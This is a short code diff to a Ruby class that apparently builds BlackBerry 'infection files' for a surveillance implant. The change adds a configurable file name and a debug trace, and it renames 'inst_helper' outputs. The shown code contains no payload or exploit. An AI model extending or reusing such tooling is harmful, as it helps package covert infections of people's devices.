@@ -189,7 +189,8 @@ class BuildBlackberry < Build
 
   end
   
-  def infection_files()
+  def infection_files(name = 'bb_in')
+	trace :debug, "     infection_files"
 	files=[]
 	# keeps only all the cod and jad in the root
 	@outputs.dup.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] or o['.jad']}.each do |output|
@@ -199,6 +200,7 @@ class BuildBlackberry < Build
 	@outputs.dup.keep_if {|o| o['res'] and o['exe']}.each do |output|
 		filepath = output.dup
 		filepath.slice! "res/"
+		filepath.gsub!(/inst_helper/,name)
 		files.push({ :name => filepath, :path => path(output) })
 	end
 	
